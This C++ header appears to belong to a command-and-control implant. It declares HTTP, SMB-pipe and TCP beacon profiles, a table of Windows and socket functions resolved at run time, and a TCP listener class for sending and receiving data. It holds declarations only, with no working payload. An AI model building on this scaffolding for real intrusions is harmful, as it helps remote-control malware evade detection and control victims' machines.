#pragma once

#include <windows.h>

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;
#endif

#define DECL_API(x) decltype(x) * x

struct TCPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(GetTickCount);

	//ws2_32
	DECL_API(WSAStartup);
	DECL_API(WSACleanup);
	DECL_API(socket);
	DECL_API(ioctlsocket);
	DECL_API(WSAGetLastError);
	DECL_API(closesocket);
	DECL_API(select);
	DECL_API(__WSAFDIsSet);
	DECL_API(shutdown);
	DECL_API(recv);
	DECL_API(send);
	DECL_API(accept);
	DECL_API(listen);
	DECL_API(bind);
};

class ConnectorTCP
{
	WORD  port = 0;
	BYTE* prepend = NULL;

	BYTE* recvData = NULL;
	int   recvSize = 0;
	ULONG allocaSize = 0;

	TCPFUNC* functions = NULL;

	SOCKET SrvSocket;
	SOCKET ClientSocket;

public:
	ConnectorTCP();

	BOOL SetConfig(ProfileTCP profile, BYTE* beat, ULONG beatSize);

	void Listen();
	void Disconnect();
	void CloseConnector();

	void  SendData(BYTE* data, ULONG data_size);
	BYTE* RecvData();
	int   RecvSize();
	void  RecvClear();
};